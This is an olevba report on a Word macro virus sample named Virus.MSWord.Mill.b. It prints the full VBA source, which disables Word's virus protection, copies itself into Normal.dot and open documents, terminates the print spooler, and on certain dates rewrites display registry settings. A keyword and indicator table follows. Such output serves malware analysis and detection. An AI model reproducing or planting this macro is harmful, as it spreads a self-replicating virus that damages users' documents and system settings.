olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mill.b-b56ffe378e7f93fd5019bd24cbea5e6d38f6ddd7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mill.b-b56ffe378e7f93fd5019bd24cbea5e6d38f6ddd7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'MZdfgopkdfkl;gdf;lgkd;lgdf
'Çåñü ìîæåò áûòü âàøà ïðîãà
Dim N As Boolean
Dim s, s2 As String
Dim o1, o2 As Object
Const a = 0, b = "DMB 2K+01 super v.1.0", c = 5000, d = "dxview.exe", e = 10
Private Sub op()
Set o1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set o2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
' Îòêëþ÷àåì àíòèâèðóñíóþ çàùèòó
Options.VirusProtection = a
ShowVisualBasicEditor = a
End Sub
Private Sub document_close()
On Error Resume Next
Call op
Call DEAD
' Îïðåäåëÿåì çàðàæåí ëè Normal.dot
  If o1.Find(b, 1, 1, c, c) = a Then
 ' Èíñòàëèðóåì â ñèñòåìó
  o1.DeleteLines 1, o1.Countoflines
  s = o2.lines(1, o2.Countoflines)
  o1.AddFromString s
  If NormalTempale.Saved = True Then NormalTemplate.Save
  End If
End Sub

Private Sub Document_New()
On Error Resume Next
Call op
' Destroy spooler
For I = 1 To Tasks.Count
If Tasks(I).Name = "Spooler Process" Then
Tasks(I).SendWindowMessage &H2, 0, 0
End If
Next I
' Îïðåäåëÿåì îòêðûòûòå äîêóìåíòû è çàðàæàåì èõ
    If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If

End Sub
Private Sub Document_Open()
On Error Resume Next
Call op
If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If
End Sub

Private Sub Decompile()
On Error Resume Next
Call op
Dim W, W2 As String
Dim Z, Z2, Z3 As Long
Z3 = 0
3: Z3 = Z3 + 1
Mp = Chr(66 + Z3) + ":\"
If Z3 = 4 Then GoTo 2
M = Dir(Mp, 16)
Do While M <> ""
        If GetAttr(Mp & M) = 16 Then
        My1 = Mp + M + "\explorer.exe"
        My2 = Mp + M + "\win.ini"
        Z = FileLen(My1)
        Z2 = FileLen(My2)
        If (Z > 0) And (Z2 > 0) Then GoTo 1
        End If
        M = Dir
Loop
GoTo 3
1: W = Mp + M
W2 = W + "\" + d
' Ïðîâåðèì åñòü ëè íàø ôàéë
Z = FileLen(W)
If Z > 0 Then GoTo 2
' Ñîçäàòü ôàéë âñå íîðìàëüíî
s = o2.lines(1, o2.Countoflines)
If Mid(s, 2, 2) = "MZ" Then

End If
'Open d For Output As #1
'Print #1, "d"
'Close #1
2:
End Sub

Private Sub DEAD()
If (Year(Now) > 2001) Or (Year(Now) = 2001 And Month(Now) > 6) Then
If (Day(Now) = 13) Or (Day(Now) = 25) Or (Day(Now) = 14) Then
' Äåñòðóêòèâíûå äåéñòâèÿ
S3 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Display\000"
s2 = "\MODES\"
s1 = "RefreshRate"
For I = 48 To 49
For j = 1 To 4
s4 = Mid(Str(8 * j), 2, 2)
s = S3 + Chr(I) + s2 + s4 + "\640,480"
System.PrivateProfileString("", s, s1) = "60"
s = S3 + Chr(I) + s2 + s4 + "\800,600"
System.PrivateProfileString("", s, s1) = "60"
s = S3 + Chr(I) + s2 + s4 + "\1024,768"
System.PrivateProfileString("", s, s1) = "60"
Next j
s = S3 + Chr(I) + s2 + "4\640,480"
System.PrivateProfileString("", s, s1) = "60"
Next I
End If
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |dxview.exe          |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
